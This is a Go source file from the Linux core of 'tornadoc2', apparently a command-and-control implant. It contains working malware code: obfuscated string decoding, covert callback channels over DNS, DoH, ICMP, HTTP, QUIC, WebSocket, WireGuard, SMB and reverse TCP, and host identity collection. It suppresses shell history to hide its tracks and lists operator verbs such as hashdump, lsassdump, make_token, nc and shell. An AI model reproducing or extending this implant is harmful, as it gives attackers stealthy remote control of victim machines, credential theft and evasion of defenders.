//go:build linux

package core

import (
	"crypto/ecdsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
	"tornadoc2/agent/crypto"
	"tornadoc2/agent/features"
	"tornadoc2/agent/protocol"
	"tornadoc2/agent/transport"
)

func deobf(encoded string, keyHex string) string {
	if encoded == "" || keyHex == "" {
		return encoded
	}
	key, err := hex.DecodeString(keyHex)
	if err != nil || len(key) == 0 {
		return encoded
	}
	raw, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return encoded
	}
	out := make([]byte, len(raw))
	for i := range raw {
		out[i] = raw[i] ^ key[i%len(key)]
	}
	return string(out)
}
func diag(format string, args ...interface{}) {
	if !Verbose {
		return
	}
	ts := time.Now().Format("15:04:05.000")
	fmt.Fprintf(os.Stderr, ts+" "+format, args...)
}
func newAgent(cfg Config) (*Agent, error) {
	diag("[agent] newAgent starting\n")
	a := &Agent{
		cfg: cfg,
		rng: rand.New(rand.NewSource(time.Now().UnixNano())),
	}

	var pivotPriv *ecdsa.PrivateKey
	var pivotPub *ecdsa.PublicKey
	if PivotPrivKeyB64 != "" {
		diag("[agent] parsing pivot private key\n")
		der, err := base64.StdEncoding.DecodeString(PivotPrivKeyB64)
		if err != nil {
			return nil, fmt.Errorf("pivot priv key b64: %w", err)
		}
		k, err := x509.ParsePKCS8PrivateKey(der)
		if err != nil {
			return nil, fmt.Errorf("pivot priv key parse: %w", err)
		}
		ec, ok := k.(*ecdsa.PrivateKey)
		if !ok {
			return nil, errors.New("pivot priv key is not ECDSA")
		}
		pivotPriv = ec
		diag("[agent] pivot private key loaded\n")
	}
	if PivotPubKeyB64 != "" {
		diag("[agent] parsing pivot public key\n")
		der, err := base64.StdEncoding.DecodeString(PivotPubKeyB64)
		if err != nil {
			return nil, fmt.Errorf("pivot pub key b64: %w", err)
		}
		k, err := x509.ParsePKIXPublicKey(der)
		if err != nil {
			return nil, fmt.Errorf("pivot pub key parse: %w", err)
		}
		ec, ok := k.(*ecdsa.PublicKey)
		if !ok {
			return nil, errors.New("pivot pub key is not ECDSA")
		}
		pivotPub = ec
		diag("[agent] pivot public key loaded\n")
	}
	a.pivotPriv = pivotPriv
	a.pivotPub = pivotPub

	diag("[agent] loading C2 profile\n")
	a.profile = defaultProfile()

	profileBlob := []byte(ProfileJSON)
	if ProfileJSON != "" {
		if err := json.Unmarshal([]byte(ProfileJSON), &a.profile); err != nil {
			if raw, derr := base64.StdEncoding.DecodeString(ProfileJSON); derr == nil {
				profileBlob = raw
				_ = json.Unmarshal(raw, &a.profile)
			}
		}
	}
	a.profile = a.profile.Resolved()
	diag("[agent] profile resolved: ua=%q beacon=%q tasks=%q "+
		"results=%q\n",
		a.profile.UserAgent, a.profile.BeaconPath,
		a.profile.TasksPath, a.profile.ResultsPath)

	if len(profileBlob) > 0 {
		diag("[agent] checking for shaping block\n")
		var raw map[string]json.RawMessage
		if err := json.Unmarshal(profileBlob, &raw); err == nil {
			if shRaw, ok := raw["shaping"]; ok {
				var sh features.ShapingSpec
				if err := json.Unmarshal(shRaw, &sh); err != nil {
					return nil, fmt.Errorf(
						"embedded shaping block is malformed: %w", err)
				}
				if err := features.ValidateShapingSpec(&sh); err != nil {
					return nil, fmt.Errorf(
						"embedded shaping block is invalid: %w", err)
				}
				a.shaping = &sh
				diag("[agent] shaping block validated\n")
			}
		}
	}

	if ServerPubKeyPem != "" {
		diag("[agent] parsing embedded server public key\n")
		raw, err := base64.StdEncoding.DecodeString(ServerPubKeyPem)
		if err == nil {
			if pub := ParseECDSAPublicKey(raw); pub != nil {
				a.serverPub = pub
				diag("[agent] server public key loaded — task " +
					"signature verification enabled\n")
			} else {
				diag("[agent] server public key parse returned nil\n")
			}
		} else {
			diag("[agent] server public key b64 decode failed: %v\n",
				err)
		}
	} else {
		diag("[agent] no server public key embedded — task " +
			"signature verification disabled\n")
	}

	if AgentPrivKeyPem != "" {
		diag("[agent] parsing embedded agent private key\n")
		raw, err := base64.StdEncoding.DecodeString(AgentPrivKeyPem)
		if err == nil {
			if priv, err := parseECDSAPrivateKey(raw); err == nil {
				a.agentPriv = priv
				diag("[agent] agent signing key loaded — result " +
					"and identity signing enabled\n")
			} else {
				diag("[agent] agent private key parse failed: %v\n",
					err)
			}
		} else {
			diag("[agent] agent private key b64 decode failed: %v\n",
				err)
		}
	} else {
		diag("[agent] no agent signing key embedded — results " +
			"will be unsigned\n")
	}

	diag("[agent] creating wire encryption session\n")
	ws, err := crypto.NewWireSession(ServerECDHPubkey)
	if err != nil {
		return nil, fmt.Errorf("wire session: %w", err)
	}
	a.wire = ws
	if ws != nil {
		diag("[agent] wire encryption ENABLED (P-256 ECDH + " +
			"AES-256-GCM)\n")
	} else {
		diag("[agent] wire encryption DISABLED — plaintext mode\n")
	}

	if SMBPipe != "" && TCPBindAddr != "" {
		return nil, errors.New(
			"SMBPipe and TCPBindAddr are both set; the two " +
				"child transports are mutually exclusive. " +
				"Rebuild with only one.")
	}

	if SMBPipe != "" {
		diag("[agent] building SMB transport pipe=%q\n", SMBPipe)
		if TransportMode != "" && TransportMode != "smb" {
			return nil, errors.New(
				"SMBPipe set but TransportMode is not 'smb'; " +
					"the SMB transport has no fallback")
		}
		if pivotPub == nil {
			return nil, errors.New(
				"transport=smb requires the pivot public " +
					"key (set --pivot-key or " +
					"--pivot-key-gen at build time)")
		}
		a.identity = GatherIdentity(cfg)
		smbT, err := transport.NewSMBTransport(SMBPipe,
			a.agentPriv, pivotPub, a.identity, a.shaping)
		if err != nil {
			return nil, fmt.Errorf("smb transport: %w", err)
		}
		a.transports = append(a.transports, smbT)
		a.transportNames = append(a.transportNames, "smb")
		a.transportIndex = 0
		a.transport = a.transports[0]
		if KillDays > 0 {
			a.deadline = time.Now().Add(
				time.Duration(KillDays) * 24 * time.Hour)
			diag("[agent] kill deadline set: %s\n",
				a.deadline.Format(time.RFC3339))
		}
		diag("[agent] SMB transport ready\n")
		return a, nil
	}

	if TCPBindAddr != "" {
		diag("[agent] building TCP bind transport addr=%q\n",
			TCPBindAddr)
		if TransportMode != "" && TransportMode != "tcp" {
			return nil, errors.New(
				"TCPBindAddr set but TransportMode is not 'tcp'")
		}
		if TCPBindToken == "" {
			return nil, errors.New(
				"TCPBindAddr set but TCPBindToken is empty")
		}
		if pivotPub == nil {
			return nil, errors.New(
				"transport=tcp requires the pivot public key")
		}
		a.identity = GatherIdentity(cfg)
		tcpT, err := transport.NewTCPBindTransport(
			TCPBindAddr, TCPBindToken,
			a.agentPriv, pivotPub, a.identity, a.shaping)
		if err != nil {
			return nil, err
		}
		a.transports = append(a.transports, tcpT)
		a.transportNames = append(a.transportNames, "tcp")
		a.transportIndex = 0
		a.transport = a.transports[0]
		if KillDays > 0 {
			a.deadline = time.Now().Add(
				time.Duration(KillDays) * 24 * time.Hour)
			diag("[agent] kill deadline set: %s\n",
				a.deadline.Format(time.RFC3339))
		}
		diag("[agent] TCP bind transport ready\n")
		return a, nil
	}

	if TCPRevTarget != "" {
		diag("[agent] building TCP reverse transport target=%q\n",
			TCPRevTarget)
		if TransportMode != "" && TransportMode != "tcprev" {
			return nil, errors.New(
				"TCPRevTarget set but TransportMode is not 'tcprev'")
		}
		if TCPRevToken == "" {
			return nil, errors.New(
				"TCPRevTarget set but TCPRevToken is empty")
		}
		if pivotPub == nil {
			return nil, errors.New(
				"transport=tcprev requires the pivot public key")
		}
		a.identity = GatherIdentity(cfg)
		revT, err := transport.NewTCPRevTransport(
			TCPRevTarget, TCPRevToken,
			a.agentPriv, pivotPub, a.identity, a.shaping)
		if err != nil {
			return nil, fmt.Errorf(
				"tcp reverse transport: %w", err)
		}
		a.transports = append(a.transports, revT)
		a.transportNames = append(a.transportNames, "tcprev")
		a.transportIndex = 0
		a.transport = a.transports[0]
		if KillDays > 0 {
			a.deadline = time.Now().Add(
				time.Duration(KillDays) * 24 * time.Hour)
			diag("[agent] kill deadline set: %s\n",
				a.deadline.Format(time.RFC3339))
		}
		diag("[agent] TCP reverse transport ready\n")
		return a, nil
	}

	modes := splitTransportModes(TransportMode)
	if len(modes) == 0 {
		return nil, errors.New("no transport configured")
	}
	diag("[agent] transport modes: %v\n", modes)

	for _, mode := range modes {
		diag("[agent] building transport %q\n", mode)
		switch mode {
		case "dns":
			if DNSDomain == "" {
				return nil, errors.New("transport=dns but no DNSDomain")
			}
			dnsT, err := transport.NewDNSTransport(
				DNSDomain, DNSResolver)
			if err != nil {
				return nil, err
			}
			a.transports = append(a.transports, dnsT)
			a.transportNames = append(a.transportNames, "dns")
			diag("[agent] dns transport ready zone=%q resolver=%q\n",
				DNSDomain, DNSResolver)
		case "doh":
			if DNSDomain == "" {
				return nil, errors.New("transport=doh but no DNSDomain")
			}
			dohTLS, err := BuildDoHTLSConfig(cfg)
			if err != nil {
				return nil, err
			}
			dohT, err := transport.NewDoHTransport(
				DNSDomain, DoHResolver,
				DoHHostHeader, DoHUserAgent, dohTLS)
			if err != nil {
				return nil, err
			}
			a.transports = append(a.transports, dohT)
			a.transportNames = append(a.transportNames, "doh")
			diag("[agent] doh transport ready zone=%q resolver=%q\n",
				DNSDomain, DoHResolver)
		case "icmp":
			if !supportsICMP {
				return nil, errors.New(
					"transport=icmp is not implemented on Windows")
			}
			if ICMPHost == "" {
				return nil, errors.New("transport=icmp but no ICMPHost")
			}
			icmpT, err := transport.NewICMPTransport(ICMPHost)
			if err != nil {
				return nil, err
			}
			a.transports = append(a.transports, icmpT)
			a.transportNames = append(a.transportNames, "icmp")
			diag("[agent] icmp transport ready host=%q\n", ICMPHost)
		case "http":
			tlsCfg, err := BuildTLSConfig(cfg)
			if err != nil {
				return nil, err
			}
			httpT, err := transport.NewHTTPTransport(
				DefaultURL, a.profile, tlsCfg, a.shaping)
			if err != nil {
				return nil, err
			}
			a.transports = append(a.transports, httpT)
			a.transportNames = append(a.transportNames, "http")
			diag("[agent] http transport ready url=%q tls=%v\n",
				DefaultURL, tlsCfg != nil)
		case "quic":
			tlsCfg, err := BuildTLSConfig(cfg)
			if err != nil {
				return nil, err
			}
			quicT, err := transport.NewQUICTransport(
				DefaultURL, a.profile, tlsCfg, a.shaping)
			if err != nil {
				return nil, err
			}
			a.transports = append(a.transports, quicT)
			a.transportNames = append(a.transportNames, "quic")
			diag("[agent] quic transport ready url=%q\n", DefaultURL)
		case "websocket":
			url := WebSocketURL
			if url == "" {
				url = DefaultURL
			}
			if url == "" {
				return nil, errors.New(
					"transport=websocket but no callback URL " +
						"is embedded (WebSocketURL and " +
						"DefaultURL are both empty)")
			}
			tlsCfg, err := BuildTLSConfig(cfg)
			if err != nil {
				return nil, err
			}
			wsT, err := transport.NewWebSocketTransport(
				url, a.profile, tlsCfg, a.shaping)
			if err != nil {
				return nil, err
			}
			a.transports = append(a.transports, wsT)
			a.transportNames = append(a.transportNames, "websocket")
			diag("[agent] websocket transport ready url=%q tls=%v\n",
				url, tlsCfg != nil)
		case "wireguard":
			if WireGuardServerPubKey == "" {
				return nil, errors.New(
					"transport=wireguard requires " +
						"WireGuardServerPubKey")
			}
			if WireGuardServerAddr == "" {
				return nil, errors.New(
					"transport=wireguard requires " +
						"WireGuardServerAddr")
			}
			if WireGuardAgentPrivKey == "" {
				return nil, errors.New(
					"transport=wireguard requires " +
						"WireGuardAgentPrivKey")
			}
			if WireGuardTunnelIP == "" {
				return nil, errors.New(
					"transport=wireguard requires " +
						"WireGuardTunnelIP")
			}
			tlsCfg, err := BuildTLSConfig(cfg)
			if err != nil {
				return nil, err
			}
			wgT, err := transport.NewWireGuardTransport(
				WireGuardServerPubKey,
				WireGuardServerAddr,
				WireGuardAgentPrivKey,
				WireGuardTunnelIP,
				WireGuardInnerPort,
				WireGuardServerTunnelIP,
				a.profile, tlsCfg, a.shaping)
			if err != nil {
				return nil, err
			}
			a.transports = append(a.transports, wgT)
			a.transportNames = append(a.transportNames, "wireguard")
			diag("[agent] wireguard transport ready "+
				"server=%q tunnel=%q\n",
				WireGuardServerAddr, WireGuardTunnelIP)
		case "tcp":
			return nil, errors.New(
				"transport 'tcp' must be used alone, via TCPBindAddr")
		case "tcprev":
			return nil, errors.New(
				"transport 'tcprev' must be used alone, via TCPRevTarget")
		default:
			return nil, fmt.Errorf("unknown transport: %s", mode)
		}
	}
	a.transportIndex = 0
	a.transport = a.transports[0]

	if KillDays > 0 {
		a.deadline = time.Now().Add(
			time.Duration(KillDays) * 24 * time.Hour)
		diag("[agent] kill deadline set: %s\n",
			a.deadline.Format(time.RFC3339))
	}

	a.identity = GatherIdentity(cfg)
	diag("[agent] identity: host=%q user=%q machine_id=%q "+
		"os=%q arch=%q\n",
		a.identity.Hostname, a.identity.Username,
		truncate(a.identity.MachineID, 16),
		a.identity.OS, a.identity.Arch)
	diag("[agent] newAgent complete — %d transport(s)\n",
		len(a.transports))
	return a, nil
}
func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
func splitTransportModes(s string) []string {
	parts := strings.Split(s, ",")
	out := make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(strings.ToLower(p))
		if p != "" {
			out = append(out, p)
		}
	}
	return out
}
func isTransportFailure(msg string) bool {
	markers := []string{
		"connection refused",
		"no such host",
		"i/o timeout",
		"certificate",
		"TLS handshake",
		"dial tcp",
		"dial udp",
		"EOF",
		"network is unreachable",
		"no route to host",
		"permission denied",
		"operation not permitted",
	}
	for _, m := range markers {
		if strings.Contains(msg, m) {
			return true
		}
	}
	return false
}
func (a *Agent) rngIntn(n int) int {
	a.rngMu.Lock()
	defer a.rngMu.Unlock()
	return a.rng.Intn(n)
}
func splitScriptArgs(args []string) []string {
	for i := 1; i < len(args); i++ {
		if args[i] == "--" {
			return args[i+1:]
		}
	}
	return nil
}
func mergeStreams(stdout, stderr []byte) []byte {
	if len(stderr) == 0 {
		return stdout
	}
	if len(stdout) == 0 {
		return stderr
	}
	out := make([]byte, 0, len(stdout)+len(stderr)+16)
	out = append(out, stdout...)
	if stdout[len(stdout)-1] != '\n' {
		out = append(out, '\n')
	}
	out = append(out, []byte("[stderr]\n")...)
	out = append(out, stderr...)
	return out
}
func formatWorkHours() string {
	if protocol.WorkHoursStart == protocol.WorkHoursEnd {
		return "off"
	}
	return fmt.Sprintf("%02d:%02d-%02d:%02d",
		protocol.WorkHoursStart/60, protocol.WorkHoursStart%60,
		protocol.WorkHoursEnd/60, protocol.WorkHoursEnd%60)
}

// spawntoVerb is the task-form setter for the sacrificial
// worker path used by execute_assembly. It is the DNS transport's
// equivalent of the X-Beacon-SpawnTo response header the HTTP,
// QUIC, and WebSocket transports carry; the two paths write the
// same Agent.spawnTo field, and ExecAssemblyOutOfProcess reads it
// in both cases.
//
// Two values are meaningful:
//
//   - "-" or ""   — clear the override. The worker falls back to
//     the default path under %LOCALAPPDATA%.
//   - anything else — a literal path on the target. Validated
//     for length and control bytes only; whether
//     the file exists is checked at spawn time,
//     not at set time, because the operator may be
//     setting a path that will be created between
//     now and the next execute_assembly.
//
// The reserved word "self" is refused: it named a self-spawn
// mode that ran the worker from the beacon's own on-disk file,
// and that mode is gone because a worker sharing the parent's
// file is a footgun the default path exists to avoid.
func encodeOutput(raw []byte) string {
	return base64.StdEncoding.EncodeToString(raw)
}

// stripChildEnv removes variables that describe the operator's
// session rather than the target environment.
func stripChildEnv(e string) bool {
	for _, p := range []string{
		"HISTFILE=", "HISTSIZE=", "HISTFILESIZE=",
		"HISTCONTROL=", "HISTIGNORE=", "HISTTIMEFORMAT=",
		"GODEBUG=", "GOTRACEBACK=", "GOCOVERDIR=",
		"OLDPWD=", "PWD=", "SHLVL=", "_=",
		"TERM_PROGRAM=", "WT_SESSION=", "TMUX=", "STY=",
		"SSH_CONNECTION=", "SSH_CLIENT=", "SSH_TTY=",
		"XDG_SESSION_TYPE=", "XDG_CURRENT_DESKTOP=",
		"DESKTOP_SESSION=",
	} {
		if strings.HasPrefix(e, p) {
			return true
		}
	}
	return false
}

func sanitizedEnv() []string {
	base := os.Environ()
	out := make([]string, 0, len(base)+5)
	for _, e := range base {
		if stripChildEnv(e) {
			continue
		}
		out = append(out, e)
	}
	out = append(out,
		"HISTFILE=/dev/null",
		"HISTSIZE=0",
		"HISTFILESIZE=0",
		"HISTCONTROL=ignorespace",
		"HISTIGNORE=*",
		"HISTTIMEFORMAT=",
	)
	return out
}
func localOutboundAddr() string {
	conn, err := net.Dial("udp", "8.8.8.8:53")
	if err != nil {
		return ""
	}
	defer conn.Close()
	ua, ok := conn.LocalAddr().(*net.UDPAddr)
	if !ok || ua == nil || ua.IP == nil {
		return ""
	}
	return ua.IP.String()
}
func mustGetwd() string {
	wd, err := os.Getwd()
	if err != nil {
		return "?"
	}
	return wd
}
func ParseClock(s string) (int, bool) {
	parts := strings.SplitN(strings.TrimSpace(s), ":", 2)
	if len(parts) != 2 {
		return 0, false
	}
	h, err := strconv.Atoi(parts[0])
	if err != nil || h < 0 || h > 23 {
		return 0, false
	}
	m, err := strconv.Atoi(parts[1])
	if err != nil || m < 0 || m > 59 {
		return 0, false
	}
	return h*60 + m, true
}

var nativeExtraVerbs = map[string]bool{
	"find": true, "grep": true, "head": true, "tail": true,
	"stat": true, "strings": true, "hexdump": true,
	"sha1": true, "sha256": true, "md5": true,
	"readlink": true, "realpath": true, "du": true,
	"mkdir": true, "rm": true, "cp": true, "mv": true,
	"chmod": true, "ln": true, "touch": true,
	"wc": true, "nl": true, "rev": true, "sort": true,
	"uniq": true, "tr": true, "cksum": true,
	"base64": true, "gzip": true, "gunzip": true,
	"which": true, "ifconfig": true,
	"curl": true, "resolve": true, "nc": true,
	"df": true, "uptime": true, "date": true,
	"getpid": true, "getppid": true,
	"screenshot": true,
	"netstat":    true, "arp": true, "route": true,
	"users": true, "groups": true,
	"av-list":    true,
	"hashdump":   true,
	"enablepriv": true,
	"lsassdump":  true,
	"make_token": true,
	"runas":      true,
	"rev2self":   true,
	"shell":      true,
}
